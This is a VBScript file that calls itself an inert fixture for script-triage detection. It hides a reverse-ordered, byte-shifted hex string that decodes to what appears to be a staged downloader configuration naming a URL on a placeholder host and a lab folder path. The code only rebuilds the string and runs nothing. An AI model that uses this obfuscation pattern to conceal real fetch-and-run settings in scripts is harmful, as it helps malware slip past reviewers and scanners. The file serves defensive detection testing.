Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_5899e3f2 = "74:73:43:42:42:46:77:48:40:75:72:80:7d:81:86:40:75:7a:7d:72:87:7f:7a:3f:76:7d:81:7e:72:89:76:3f:49:77:44:72:48:75:46:44:47:75:40:40:4b:84:81:85:85:79:4e:7d:83:86:70:75:72:80:7d:81:86:8d:85:72:75:3f:49:77:44:72:48:75:46:44:47:75:3e:76:78:72:85:84:6d:73:72:5d:84:84:76:83:85:7f:86:59:6d:74:7a:7d:73:86:61:6d:84:83:76:84:66:6d:4b:54:4e:79:85:72:81:70:76:7d:7a:77:8d:49:77:44:72:48:75:46:44:47:75:40:73:72:5d:84:84:76:83:85:7f:86:59:4e:85:7f:76:78:72:70:83:76:84:86:8d:85:72:75:3f:72:43:47:44:41:74:41:47:40:75:7a:7d:72:87:7f:7a:3f:76:7d:81:7e:72:89:76:3f:49:77:44:72:48:75:46:44:47:75:40:40:4b:84:81:85:85:79:4e:7d:83:86:8d:49:77:44:72:48:75:46:44:47:75:3e:7f:78:7a:72:81:7e:72:74:4e:75:7a:70:7f:78:7a:72:81:7e:72:74:8d:43:4e:85:7f:86:80:74:70:76:78:72:85:84:8d:41:3f:47:3f:61:65:65:59:5d:5e:69:83:76:87:83:76:64:3f:43:5d:5e:69:64:5e:4e:83:76:85:81:72:75:72:8d:76:85:80:7e:76:83:70:75:72:80:7d:81:86:3d:83:76:77:84:7f:72:83:85:70:76:83:72:81:76:83:81:3d:7d:72:74:80:7d:70:76:85:72:74:80:7d:4e:84:81:76:85:84:8d:42:4e:87"
Const Codec_5899e3f2 = "reversed_hex|add_modulo_256|11"

Function Load_5899e3f2()
  Dim parts, result(), v_e598
  parts = Split(Material_5899e3f2, ":")
  ReDim result(UBound(parts))
  For v_e598 = 0 To UBound(parts)
    result(UBound(parts) - v_e598) = CInt("&H" & parts(v_e598))
  Next
  Load_5899e3f2 = result
End Function

Function Decode_5899e3f2(ByRef v_a19c)
  Dim result(), v_e598, keyBytes, previous
  ReDim result(UBound(v_a19c))
  For v_e598 = 0 To UBound(v_a19c)
    result(v_e598) = (v_a19c(v_e598) - 17 + 256) Mod 256
  Next
  Decode_5899e3f2 = result
End Function

Function Recover_5899e3f2()
  Dim v_a19c, v_b27e, v_c304, v_d41a, v_e598, v_f602, v_a702, v_b803
  ' configuration reconstruction
v_d41a = (19 * 7) - 133
  v_a19c = Load_5899e3f2()
  Select Case 1
    Case 1
      v_b27e = Decode_5899e3f2(v_a19c)
    Case Else
      v_b27e = Array()
  End Select
  v_c304 = ""
  For v_e598 = 0 To UBound(v_b27e)
    v_c304 = v_c304 & Chr(v_b27e(v_e598))
  Next
' reconstruction complete
  Recover_5899e3f2 = v_c304
End Function

Function Inspect_5899e3f2()
  Dim fields
  fields = Split(Recover_5899e3f2(), "|")
  Inspect_5899e3f2 = Join(fields, "|")
End Function
